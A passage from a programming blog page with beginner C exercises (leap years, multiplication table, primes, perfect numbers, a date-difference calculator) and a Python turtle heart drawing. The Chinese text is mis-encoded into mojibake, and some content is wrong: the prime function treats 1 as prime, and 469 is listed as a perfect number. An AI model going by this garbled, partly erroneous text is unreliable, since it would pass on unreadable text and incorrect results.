class="keyword">for</span>(year=<span class="number">2001</span>;year&lt;=<span class="number">2100</span>;year++)</span><br><span class="line">		<span class="keyword">if</span>(LeapYear_PeaceYear(year)==<span class="number">1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,year);</span><br><span class="line">				j++;</span><br><span class="line">				<span class="keyword">if</span>(j%<span class="number">6</span>==<span class="number">0</span>)</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nå¹³å¹´ï¼š\n&quot;</span>);</span><br><span class="line">	j=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(year=<span class="number">2001</span>;year&lt;=<span class="number">2100</span>;year++)</span><br><span class="line">		<span class="keyword">if</span>(LeapYear_PeaceYear(year)==<span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,year);</span><br><span class="line">				j++;</span><br><span class="line">				<span class="keyword">if</span>(j%<span class="number">6</span>==<span class="number">0</span>)</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/211.jpg"></p>
<h2 id="ä¹ä¹ä¹˜æ³•è¡¨"><a href="#ä¹ä¹ä¹˜æ³•è¡¨" class="headerlink" title="ä¹ä¹ä¹˜æ³•è¡¨"></a>ä¹ä¹ä¹˜æ³•è¡¨</h2><p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">9</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%2d*%2d=%2d&quot;</span>,i,j,i*j);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/99.jpg"></p>
<h2 id="å€’ç€è¾“å‡º"><a href="#å€’ç€è¾“å‡º" class="headerlink" title="å€’ç€è¾“å‡º"></a>å€’ç€è¾“å‡º</h2><p>è¾“å…¥ä¸€ä¸ªæ•´æ•°ï¼š123 è¾“å‡ºï¼š321  </p>
<p>æºä»£ç ï¼š </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x,a,r=<span class="number">0</span>,t=<span class="number">10</span>,e;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸€ä¸ªæ•°ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">	e=x;</span><br><span class="line">	<span class="keyword">while</span>(x)</span><br><span class="line">		&#123;</span><br><span class="line">			a=x%<span class="number">10</span>;</span><br><span class="line">			r=r*t+a;</span><br><span class="line">			x/=<span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d---%d\n&quot;</span>,e,r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š</p>
<p><img src="/2019/08/12/OLD/321.jpg"></p>
<h2 id="ä½ çŸ¥é“ä½ æ´»äº†å¤šå°‘å¤©äº†å—ï¼Ÿ"><a href="#ä½ çŸ¥é“ä½ æ´»äº†å¤šå°‘å¤©äº†å—ï¼Ÿ" class="headerlink" title="ä½ çŸ¥é“ä½ æ´»äº†å¤šå°‘å¤©äº†å—ï¼Ÿ"></a>ä½ çŸ¥é“ä½ æ´»äº†å¤šå°‘å¤©äº†å—ï¼Ÿ</h2><p>é—®é¢˜ï¼šæ±‚ä½ å­˜åœ¨äºè¿™ä¸ªç¾ä¸½ä¸–ç•Œçš„å¤©æ•°ï¼  </p>
<p>å¦‚æœ‰è¯¯ è¯·æŒ‡å‡ºã€‚</p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">days_of_year</span><span class="params">(<span class="keyword">int</span> year)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">between_year_brgin_and_year_end</span><span class="params">(<span class="keyword">int</span> year_begin,<span class="keyword">int</span> year_end)</span> </span>;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">days</span><span class="params">(<span class="keyword">int</span> year,<span class="keyword">int</span> month,<span class="keyword">int</span> day)</span></span>;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> year_begin,month_begin,day_begin,sum_begin=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> year_end,month_end,day_end,sum_end=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> sum_middle=<span class="number">0</span>; </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥èµ·å§‹æ—¥æœŸï¼š\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;year_begin,&amp;month_begin,&amp;day_begin);</span><br><span class="line">	sum_begin=days(year_begin,month_begin,day_begin);<span class="comment">//ä¾‹å¦‚ï¼š2017 8 20 æ±‚1--7æœˆåˆ†çš„å¤©æ•° </span></span><br><span class="line">	sum_begin+=day_begin;<span class="comment">//æ±‚ 1--7ä»½çš„å¤©æ•° + 8æœˆ çš„å¤©æ•°ï¼ˆ20ï¼‰ == 232 å¤© </span></span><br><span class="line">	<span class="comment">//printf(&quot;%d/%d/%d æ˜¯%då¹´çš„ç¬¬%då¤©\n&quot;,year_begin,month_begin,day_begin,year_begin,sum_begin);</span></span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥æˆªæ­¢æ—¥æœŸï¼š\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;year_end,&amp;month_end,&amp;day_end);</span><br><span class="line">	sum_end=days(year_end,month_end,day_end);<span class="comment">//ä¾‹å¦‚ï¼š2019 8 20 æ±‚1--7æœˆåˆ†çš„å¤©æ•° </span></span><br><span class="line">	sum_end+=day_end;<span class="comment">//æ±‚ 1--7ä»½çš„å¤©æ•° + 8æœˆ çš„å¤©æ•°ï¼ˆ20ï¼‰ == 232 å¤© </span></span><br><span class="line">	<span class="comment">//printf(&quot;%d/%d/%d æ˜¯%då¹´çš„ç¬¬%då¤©\n&quot;,year_end,month_end,day_end,year_end,sum_end);</span></span><br><span class="line">	sum_middle+=between_year_brgin_and_year_end(year_begin,year_end);<span class="comment">//æ±‚èµ·å§‹å¹´ä»½ä¸ç»“æŸå¹´ä»½ ä¸­é—´å¹´ä»½çš„å¤©æ•°  </span></span><br><span class="line">	<span class="comment">//printf(&quot;ä¸­é—´å¹´ä»½çš„å¤©æ•°ï¼š%d\n&quot;,sum_middle);						 //ä¾‹å¦‚ï¼š 2017--2019 å³ æ±‚ä¸­é—´å¹´ä»½ 2018 çš„å¤©æ•°</span></span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(year_begin!=year_end)</span><br><span class="line">		sum_begin=days_of_year(year_begin)-sum_begin;<span class="comment">//æ±‚2017 8 20 ä¹‹å åˆ°2017å¹´çš„æœ€åä¸€å¤©çš„ å¤©æ•°</span></span><br><span class="line">												<span class="comment">// ä¾‹å¦‚ 2017 8 20 æ˜¯2017å¹´çš„ ç¬¬232å¤© </span></span><br><span class="line">												<span class="comment">// 2017å¹´å‰©ä½™çš„å¤©æ•°  365-232=  133å¤© </span></span><br><span class="line">												</span><br><span class="line">																</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d/%d/%d--&quot;</span>,year_begin,month_begin,day_begin);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d/%d/%d&quot;</span>,  year_end,month_end,day_end);</span><br><span class="line">	<span class="keyword">if</span>(year_begin==year_end)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ç›¸éš”: %då¤©\n&quot;</span>,sum_end-sum_begin);<span class="comment">//å¦‚æœæ˜¯åŒä¸€å¹´çš„æƒ…å†µä¸‹ï¼šä¾‹å¦‚ï¼š2019/1/1---2019/2/1 ==32-1=31 </span></span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ç›¸éš”ï¼š%då¤©\n&quot;</span>,sum_begin+sum_middle+sum_end);<span class="comment">//2017/8/20 --- 2019/8/20 </span></span><br><span class="line">														<span class="comment">//   sum_begin        + sum_middle    + sum_end</span></span><br><span class="line">														<span class="comment">//     133           +  365          +   232</span></span><br><span class="line">														<span class="comment">//2017å¹´å‰©ä½™çš„å¤©æ•° + 2018çš„å¤©æ•° + 8/20æ˜¯2019çš„ç¬¬ xxxå¤© </span></span><br><span class="line">	<span class="keyword">if</span>(sum_begin+sum_middle+sum_end&gt;=<span class="number">365</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;â‰ˆ%då¹´\n&quot;</span>,(sum_begin+sum_middle+sum_end)/<span class="number">365</span>);<span class="comment">//å¦‚æœå¤©æ•°å¤ªå¤§ è½¬æ¢ä¸ºå¤§æ¦‚å¹´ä»½ </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">days_of_year</span><span class="params">(<span class="keyword">int</span> year)</span><span class="comment">//æ±‚ é—°å¹´å¹³å¹´çš„å¤©æ•° </span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(year%<span class="number">4</span>==<span class="number">0</span>&amp;&amp;year%<span class="number">100</span>!=<span class="number">0</span>||year%<span class="number">400</span>==<span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">366</span>;</span><br><span class="line">		<span class="keyword">else</span>	</span><br><span class="line">			<span class="keyword">return</span> <span class="number">365</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">between_year_brgin_and_year_end</span><span class="params">(<span class="keyword">int</span> year_begin,<span class="keyword">int</span> year_end)</span><span class="comment">//æ±‚èµ·å§‹å¹´ä»½ä¸ç»“æŸå¹´ä»½ ä¸­é—´å¹´ä»½çš„å¤©æ•°  </span></span></span><br><span class="line"><span class="function">	</span>&#123;															<span class="comment">//ä¾‹å¦‚ï¼š 2017--2019 å³ æ±‚ä¸­é—´å¹´ä»½ 2018çš„å¤©æ•° </span></span><br><span class="line">		<span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span>(year_begin!=year_end)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">for</span>(year_begin+=<span class="number">1</span>;year_begin&lt;year_end;year_begin++)</span><br><span class="line">				sum+=days_of_year(year_begin);</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">return</span> sum;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">days</span><span class="params">(<span class="keyword">int</span> year,<span class="keyword">int</span> month,<span class="keyword">int</span> day)</span><span class="comment">//æ±‚æŸå¹´æŸæœˆ æ˜¯æŸå¹´çš„å¤šå°‘å¤©  </span></span></span><br><span class="line"><span class="function">	</span>&#123;								<span class="comment">//ä¾‹å¦‚ï¼š 2019 8 20 å‰ 8-1ä¸ªæœˆçš„å¤©æ•° </span></span><br><span class="line">		<span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">switch</span>(month<span class="number">-1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">12</span>:sum+=<span class="number">31</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">11</span>:sum+=<span class="number">30</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">10</span>:sum+=<span class="number">31</span>;</span><br><span class="line">				<span class="keyword">case</span>  <span class="number">9</span>:sum+=<span class="number">30</span>;</span><br><span class="line">				<span class="keyword">case</span>  <span class="number">8</span>:sum+=<span class="number">31</span>;</span><br><span class="line">				<span class="keyword">case</span>  <span class="number">7</span>:sum+=<span class="number">31</span>;</span><br><span class="line">				<span class="keyword">case</span>  <span class="number">6</span>:sum+=<span class="number">30</span>;</span><br><span class="line">				<span class="keyword">case</span>  <span class="number">5</span>:sum+=<span class="number">31</span>;</span><br><span class="line">				<span class="keyword">case</span>  <span class="number">4</span>:sum+=<span class="number">30</span>;</span><br><span class="line">				<span class="keyword">case</span>  <span class="number">3</span>:sum+=<span class="number">31</span>;</span><br><span class="line">				<span class="keyword">case</span>  <span class="number">2</span>:<span class="keyword">if</span>(year%<span class="number">4</span>==<span class="number">0</span>&amp;&amp;year%<span class="number">100</span>!=<span class="number">0</span>||year%<span class="number">400</span>==<span class="number">0</span>) </span><br><span class="line">							sum+=<span class="number">29</span>;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">							sum+=<span class="number">28</span>;</span><br><span class="line">				<span class="keyword">case</span>  <span class="number">1</span>:sum+=<span class="number">31</span>;</span><br><span class="line">			&#125;		</span><br><span class="line">		<span class="keyword">return</span> sum;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/days.jpg"></p>
<p><img src="/2019/08/12/OLD/day.jpg"></p>
<h2 id="æ–æ³¢æ‹‰å¥‘æ•°åˆ—"><a href="#æ–æ³¢æ‹‰å¥‘æ•°åˆ—" class="headerlink" title="æ–æ³¢æ‹‰å¥‘æ•°åˆ—"></a>æ–æ³¢æ‹‰å¥‘æ•°åˆ—</h2><h2 id="fibonacci-sequence"><a href="#fibonacci-sequence" class="headerlink" title="fibonacci sequence"></a>fibonacci sequence</h2><p>åˆ©ç”¨æ•°ç»„æ±‚å‡ºæ–æ³¢æ‹‰å¥‘æ•°åˆ—å‰20é¡¹:  </p>
<p>æºä»£ç ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 20</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[N],i;</span><br><span class="line">	a[<span class="number">0</span>]=a[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;æ–æ³¢æ‹‰å¥‘æ•°åˆ—ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			a[i]=a[i<span class="number">-1</span>]+a[i<span class="number">-2</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/2.png"></p>
<h2 id="è´¨æ•°"><a href="#è´¨æ•°" class="headerlink" title="è´¨æ•°"></a>è´¨æ•°</h2><p>é™¤äº†1å’Œå®ƒæœ¬èº«ä»¥å¤–ä¸å†æœ‰å…¶ä»–å› æ•°çš„è‡ªç„¶æ•°ã€‚  </p>
<p>æˆ‘è®¤ä¸ºé™¤äº†1å’Œå®ƒæœ¬èº«ä¹‹å¤– å¤ªå­¤ç‹¬äº†!</p>
<p>so  lonely_number()  </p>
<p>æºä»£ç ï¼š  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lonely_number</span><span class="params">(<span class="keyword">int</span> number)</span><span class="comment">//é™¤äº†1å’Œå®ƒæœ¬èº«ä»¥å¤–ä¸å†æœ‰å…¶ä»–å› æ•°çš„è‡ªç„¶æ•°ã€‚</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=number/<span class="number">2</span>;i++)</span><br><span class="line">		<span class="keyword">if</span>(number%i==<span class="number">0</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">if</span>(i&gt;number/<span class="number">2</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1000ä»¥å†…çš„è´¨æ•°ï¼ˆç´ æ•°ï¼‰ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">1000</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(lonely_number(i))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;%3d &quot;</span>,i);</span><br><span class="line">					j++;</span><br><span class="line">					<span class="keyword">if</span>(j%<span class="number">10</span>==<span class="number">0</span>)</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/lonely-number.jpg"></p>
<h2 id="max-min-sum-ave"><a href="#max-min-sum-ave" class="headerlink" title="max min sum ave"></a>max min sum ave</h2><p>è¾“å…¥Nä¸ªæ•°å­—æ±‚å‡º<br>æœ€å¤§å€¼å’Œæœ€å°å€¼<br>å’Œ<br>å¹³å‡å€¼ </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5  <span class="comment">//è‡ªå®šä¹‰å‡ ä¸ª</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[N],i,sum=<span class="number">0</span>,ave,max,min;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥%dä¸ªæ•´æ•°ï¼š&quot;</span>,N);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);  		<span class="comment">//è¾“å…¥Nä¸ªæ•°å­—</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">	  	sum+=a[i];          		<span class="comment">//æ±‚å’Œ</span></span><br><span class="line">	max=min=a[<span class="number">0</span>];           		<span class="comment">//å‡å®šç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºæœ€å¤§å€¼ï¼Œæœ€å°å€¼</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(a[i]&gt;max)</span><br><span class="line">				max=a[i];   		<span class="comment">//æ±‚æœ€å¤§</span></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(a[i]&lt;min)</span><br><span class="line">					min=a[i]; 		<span class="comment">//æ±‚æœ€å°</span></span><br><span class="line">		&#125;</span><br><span class="line">    ave=sum/N;              		<span class="comment">//æ±‚å¹³å‡å€¼</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;max=%d\nmin=%d\nsum=%d\nave=%d\n&quot;</span>,max,min,sum,ave);<span class="comment">//è¾“å‡º</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š<br>è¯·è¾“å…¥5ä¸ªæ•´æ•°ï¼š1 2 3 4 5<br>max=5<br>min=1<br>sum=15<br>ave=3</p>
<p><img src="/2019/08/12/OLD/maxmin.jpg"></p>
<h2 id="ä½¿ç”¨pythonç”»â¤"><a href="#ä½¿ç”¨pythonç”»â¤" class="headerlink" title="ä½¿ç”¨pythonç”»â¤"></a>ä½¿ç”¨pythonç”»â¤</h2><p>åˆ©ç”¨pythonç”»ä¸€ä¸ªâ¤  </p>
<p>å¯¼å…¥ turtle åº“ å¹¶èµ·ä¸€ä¸ªåˆ«åä¸ºï¼š t  </p>
<p>è¿™æ ·ä¾¿äºæ“ä½œï¼š  </p>
<p>æœ‰ç‚¹ç²—ç³™ï¼</p>
<p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle <span class="keyword">as</span> t</span><br><span class="line"><span class="comment">#ç”»äºº</span></span><br><span class="line">t.color(<span class="string">&#x27;black&#x27;</span>)</span><br><span class="line">t.pensize(<span class="number">2</span>)</span><br><span class="line">t.circle(<span class="number">40</span>)</span><br><span class="line">t.right(<span class="number">90</span>)</span><br><span class="line">t.forward(<span class="number">110</span>)</span><br><span class="line">t.right(<span class="number">45</span>)</span><br><span class="line">t.forward(<span class="number">60</span>)</span><br><span class="line">t.penup()</span><br><span class="line">t.backward(<span class="number">60</span>)</span><br><span class="line">t.left(<span class="number">43</span>)</span><br><span class="line">t.pendown()</span><br><span class="line">t.goto(<span class="number">45</span>,-<span class="number">111</span>)</span><br><span class="line">t.goto(<span class="number">45</span>,-<span class="number">180</span>)</span><br><span class="line">t.penup()</span><br><span class="line">t.goto(<span class="number">0</span>,-<span class="number">45</span>)</span><br><span class="line">t.left(<span class="number">90</span>)</span><br><span class="line">t.pendown()</span><br><span class="line">t.goto(<span class="number">70</span>,-<span class="number">45</span>)</span><br><span class="line">t.goto(<span class="number">89</span>,-<span class="number">30</span>)</span><br><span class="line">t.penup()</span><br><span class="line">t.goto(<span class="number">0</span>,-<span class="number">55</span>)</span><br><span class="line">t.pendown()</span><br><span class="line">t.goto(<span class="number">72</span>,-<span class="number">55</span>)</span><br><span class="line">t.right(<span class="number">34</span>)</span><br><span class="line">t.forward(<span class="number">22</span>)</span><br><span class="line">t.penup()</span><br><span class="line">t.left(<span class="number">34</span>)</span><br><span class="line">t.goto(<span class="number">199</span>,-<span class="number">50</span>)</span><br><span class="line">t.pendown()</span><br><span class="line"></span><br><span class="line">t.pensize(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">t.delay(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#ç”»â¤</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">h</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        t.right(<span class="number">1</span>)</span><br><span class="line">        t.forward(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">t.color(<span class="string">&#x27;red&#x27;</span>,<span class="string">&#x27;pink&#x27;</span>)</span><br><span class="line">t.begin_fill()</span><br><span class="line">t.left(<span class="number">140</span>)</span><br><span class="line">t.forward(<span class="number">111.65</span>)</span><br><span class="line">h()</span><br><span class="line">t.left(<span class="number">120</span>)</span><br><span class="line">h()</span><br><span class="line">t.forward(<span class="number">111.65</span>)</span><br><span class="line">t.end_fill()</span><br><span class="line"></span><br><span class="line">t.hideturtle()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/3.gif"></p>
<h2 id="å®Œå…¨æ•°-1000ä»¥å†…-ï¼ˆPerfect-numberï¼‰"><a href="#å®Œå…¨æ•°-1000ä»¥å†…-ï¼ˆPerfect-numberï¼‰" class="headerlink" title="å®Œå…¨æ•°(1000ä»¥å†…)ï¼ˆPerfect numberï¼‰"></a>å®Œå…¨æ•°(1000ä»¥å†…)ï¼ˆPerfect numberï¼‰</h2><p>è¾“å‡º1000ä»¥å†…çš„å®Œå…¨æ•°ï¼ˆPerfect numberï¼‰  </p>
<p>å¦‚æœä¸€ä¸ªæ•°æ°å¥½ç­‰äºå®ƒçš„å› å­ä¹‹å’Œï¼Œåˆ™ç§°è¯¥æ•°ä¸ºâ€œå®Œå…¨æ•°â€  </p>
<p>å¦‚ï¼š 6 ï¼Œ28, 469 â€¦â€¦  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">perfect_number</span><span class="params">(<span class="keyword">int</span> number)</span></span></span><br><span class="line"><span class="function">	</span>&#123;	</span><br><span class="line">		<span class="keyword">int</span> s,j;</span><br><span class="line">		s=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=number/<span class="number">2</span>;j++)</span><br><span class="line">			<span class="keyword">if</span>(number%j==<span class="number">0</span>)</span><br><span class="line">				s+=j;</span><br><span class="line">		<span class="keyword">if</span>(number==s)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> number;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1000ä»¥å†…çš„å®Œæ•°ï¼š\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(number=<span class="number">1</span>;number&lt;=<span class="number">1000</span>;number++)</span><br><span class="line">		<span class="keyword">if</span>(perfect_number(number)==<span class="number">1</span>) </span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,number);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š  </p>
<p><img src="/2019/08/12/OLD/02.jpg"></p>
<h2 id="ç™¾é’±ä¹°é¸¡"><a href="#ç™¾é’±ä¹°é¸¡" class="headerlink" title="ç™¾é’±ä¹°é¸¡"></a>ç™¾é’±ä¹°é¸¡</h2><p>æˆ‘å›½å¤ä»£æ•°å­¦å®¶å¼ ä¸˜å»ºåœ¨ä»–çš„ã€Šç®—ç»ã€‹ä¸­æå‡ºäº†ä¸€ä¸ªè‘—åçš„â€œç™¾é’±ä¹°ç™¾é¸¡é—®é¢˜â€ï¼š  </p>
<p>é¸¡ç¿ä¸€ï¼Œå€¼é’±äº”ï¼Œé¸¡æ¯ä¸€ï¼Œå€¼é’±ä¸‰ï¼Œé¸¡é›ä¸‰ï¼Œå€¼é’±ä¸€ï¼Œç™¾é’±ä¹°ç™¾é¸¡ï¼Œé—®ç¿ã€æ¯ã€é›å„å‡ ä½•ï¼Ÿ</p>
